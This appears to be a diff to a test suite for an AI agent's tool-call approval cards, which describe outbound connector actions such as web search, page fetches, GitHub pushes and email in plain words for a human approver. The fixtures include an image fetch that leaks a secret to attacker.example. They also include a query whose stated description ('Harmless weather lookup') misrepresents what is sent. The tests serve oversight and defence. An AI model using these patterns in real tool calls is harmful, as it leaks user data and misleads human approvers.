@@ -95,7 +95,7 @@ describe('connector card: web search', () => {
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('connector_outbound');
-    expect(card.plain_what).toBe('Search the web with `web_search` on exa.');
+    expect(card.plain_what).toBe('Search the web with web_search on exa.');
     expect(card.plain_what).not.toContain('does not recognize');
     expect(card.cannot_be_undone).toBe('Once data leaves this machine it cannot be taken back.');
     expect(card.destination_host).toBe('mcp.exa.ai');
@@ -116,7 +116,7 @@ describe('connector card: web search', () => {
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('mcp_open_world_hint');
-    expect(card.plain_what).toBe('Search the web with `tavily_search` on tavily.');
+    expect(card.plain_what).toBe('Search the web with tavily_search on tavily.');
     expect(card.destination_host).toBe('mcp.tavily.com');
     expect(card.outbound_text).toBe('query: climate data\nmax_results: 3');
   });
@@ -124,7 +124,7 @@ describe('connector card: web search', () => {
   test.each(['web_search_exa', 'webSearch', 'search_engine'])('%s is recognized as a search tool', async toolName => {
     const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
     expect(decision.reason).toBe('connector_outbound');
-    expect(cardOf(decision).plain_what).toContain(`\`${toolName}\``);
+    expect(cardOf(decision).plain_what).toContain(` with ${toolName} `);
   });
 
   test('a search tool that is not for the web says "a search", not "the web"', async () => {
@@ -132,7 +132,7 @@ describe('connector card: web search', () => {
       connectorCall({ tool_name: 'search_notes', params: { query: 'budget' } }),
       makeCtx(),
     );
-    expect(cardOf(decision).plain_what).toBe('Run a search with `search_notes` on exa.');
+    expect(cardOf(decision).plain_what).toBe('Run a search with search_notes on exa.');
   });
 
   test('names that merely contain the letters are not search tools', async () => {
@@ -156,7 +156,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       makeCtx(),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Fetch a web page with `web_fetch` on exa.');
+    expect(card.plain_what).toBe('Fetch a web page with web_fetch on exa.');
     expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
@@ -191,7 +191,7 @@ describe('connector card: fetch, repository writes and mail', () => {
     );
     const card = cardOf(decision);
     expect(decision.tier).toBe(3);
-    expect(card.plain_what).toBe('Write to repository acme/website with `push_files` on github.');
+    expect(card.plain_what).toBe('Write to repository acme/website with push_files on github.');
     expect(card.destination).toBe('acme/website');
     expect(card.destination_host).toBe('api.githubcopilot.com');
     expect(card.outbound_text).toContain('branch: main');
@@ -208,7 +208,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       }),
       makeCtx(),
     );
-    expect(cardOf(decision).plain_what).toBe('Publish a gist with `create_gist` on github.');
+    expect(cardOf(decision).plain_what).toBe('Publish a gist with create_gist on github.');
   });
 
   test('a delete is never described as a publish or a write', async () => {
@@ -240,10 +240,10 @@ describe('connector card: fetch, repository writes and mail', () => {
   });
 
   test.each([
-    ['reply_all', 'Send a reply to carol@example.com with `reply_all` on gmail.'],
-    ['forward_email', 'Forward a message to carol@example.com with `forward_email` on gmail.'],
-    ['draft_email', 'Save a message draft to carol@example.com with `draft_email` on gmail.'],
-    ['send_draft', 'Send a saved draft to carol@example.com with `send_draft` on gmail.'],
+    ['reply_all', 'Send a reply to carol@example.com with reply_all on gmail.'],
+    ['forward_email', 'Forward a message to carol@example.com with forward_email on gmail.'],
+    ['draft_email', 'Save a message draft to carol@example.com with draft_email on gmail.'],
+    ['send_draft', 'Send a saved draft to carol@example.com with send_draft on gmail.'],
   ])('%s is named in plain words with the recipient', async (toolName, expected) => {
     const decision = await classifyTier(
       connectorCall({
@@ -330,10 +330,28 @@ describe('connector card text comes from server-side params', () => {
       makeCtx('Check the weather forecast.'),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Search the web with `web_search` on exa.');
+    expect(card.plain_what).toBe('Search the web with web_search on exa.');
     expect(card.plain_what).not.toContain('weather');
     // The description is an argument that leaves the machine, so it is shown as one.
     expect(card.outbound_text).toBe('query: salary of my neighbour\ndescription: Harmless weather lookup');
+  });
+});
+
+describe('connector card wording', () => {
+  test('known connector sentences carry no markdown', async () => {
+    for (const toolName of ['web_search', 'web_fetch', 'push_files', 'create_gist', 'reply_all', 'search_notes']) {
+      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
+      expect(cardOf(decision).plain_what).not.toContain('`');
+    }
+  });
+
+  test('there is no reason line when the agent gave none, and the stated reason is kept otherwise', async () => {
+    const call = connectorCall({ tool_name: 'web_search', params: { query: 'q' } });
+    expect(cardOf(await classifyTier(call, makeCtx())).plain_why).toBeNull();
+    expect(cardOf(await classifyTier(call, makeCtx('   '))).plain_why).toBeNull();
+    expect(cardOf(await classifyTier(call, makeCtx('Looking up the listing. More detail.'))).plain_why).toBe(
+      'Looking up the listing.',
+    );
   });
 });
 
